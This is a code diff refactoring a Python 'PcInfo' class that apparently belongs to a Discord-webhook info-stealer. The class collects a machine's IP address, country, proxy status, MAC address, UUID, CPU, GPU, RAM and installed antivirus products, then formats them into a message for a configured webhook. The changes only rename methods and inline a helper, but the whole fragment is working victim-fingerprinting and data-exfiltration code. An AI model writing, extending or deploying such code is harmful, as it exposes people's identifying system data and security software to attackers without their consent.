@@ -6,11 +6,8 @@ import subprocess
 
 class PcInfo:
     def __init__(self):
-        self.get_inf(__CONFIG__["webhook"])
+        self.get_system_info(__CONFIG__["webhook"])
 
-    def get_proxy_emoji(self, proxy):
-        return ":shield:" if proxy else ":x:"
-        
     def get_country_code(self, country_name):
         try:
             country = pycountry.countries.lookup(country_name)
@@ -65,13 +62,13 @@ class PcInfo:
 :globe_with_meridians: **OS:** `{computer_os}`\n
 :eyes: **IP:** `{ip}`
 :flag_{self.get_country_code(country)}: **Country:** `{country}`
-{self.get_proxy_emoji(proxy)} **Proxy:** `{proxy}`
+{":shield:" if proxy else ":x:"} **Proxy:** `{proxy}`
 :green_apple: **MAC:** `{mac}`
 :wrench: **UUID:** `{uuid}`\n
 <:cpu:1051512676947349525> **CPU:** `{cpu}`
 <:gpu:1051512654591688815> **GPU:** `{gpu}`
 <:ram1:1051518404181368972> **RAM:** `{ram}GB`\n
-:cop: **Antivirus:** `{self.getAVSolutions()}`
+:cop: **Antivirus:** `{self.get_all_avs()}`
 '''
                         }
                     ],
